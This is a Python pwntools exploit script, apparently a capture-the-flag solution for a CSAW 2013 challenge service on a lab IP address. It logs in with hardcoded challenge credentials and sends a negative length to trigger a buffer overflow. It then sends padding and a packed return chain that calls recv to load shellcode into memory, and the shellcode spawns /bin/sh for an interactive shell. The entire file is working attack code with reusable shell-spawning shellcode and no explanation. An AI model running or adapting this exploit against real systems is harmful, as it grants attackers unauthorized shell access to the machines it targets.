from pwn import *
import struct
def main():
	HOST = "192.168.56.101"
	PORT = 34266
	shellcode = "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"
	read_ptr = 0x80486e0
	recv_ptr = 0x8048890
	p = struct.pack("<L",recv_ptr) + struct.pack("<L",0) + struct.pack("<L",4) + struct.pack("<L",0x804b040) + struct.pack("<L",len(shellcode)) + struct.pack("<L",0) + "\x00\x00\x00\x00"
	payload = "A"*1052+"B"*4+p
	print len(payload)
	conn = remote(HOST,PORT)
	raw_input("$")
	print conn.recvuntil("UserName:")
	conn.sendline("csaw2013")
	print conn.recvuntil("Password: ")
	conn.sendline("S1mplePWD")
	print conn.recvuntil("Entry Info: ")
	conn.sendline("-1")
	conn.sendline(payload+"\n")
	conn.sendline(shellcode)
	conn.interactive()
	pass
main()
